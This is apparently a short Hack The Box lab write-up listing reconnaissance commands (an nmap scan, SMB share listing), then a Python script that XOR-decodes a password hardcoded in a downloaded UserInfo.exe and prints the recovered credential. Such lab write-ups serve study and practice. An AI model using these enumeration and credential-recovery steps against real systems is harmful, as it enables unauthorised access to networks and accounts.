```
nmap -sS -sC -sV -T5 -Pn 10.10.11.174
```
![image](https://github.com/regarmulia/HTB/assets/33616880/c513fb68-50d1-41b4-8934-27824a4ed58e)

```
smbclient -L \\\\10.10.11.174\\
smbclient \\\\10.10.11.174\\support-tools
```
![image](https://github.com/regarmulia/HTB/assets/33616880/71fa0c96-fe56-4321-851b-d46f6b8f8795)

```
unzip UserInfo.exe.zip
cat UserInfo.exe.config
```
![image](https://github.com/regarmulia/HTB/assets/33616880/98094d02-a256-46d6-9bf1-f38c289f4c73)

```
import base64
from itertools import cycle

enc_password = base64.b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E")
key = b"armando"
key2 = 223

res = ''
for e,k in zip(enc_password, cycle(key)):
        res += chr(e ^ k ^ key2)

print(res)
```
```
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```
![image](https://github.com/regarmulia/HTB/assets/33616880/2b3ae44c-1a69-4e82-92c3-0ffaac79088c)
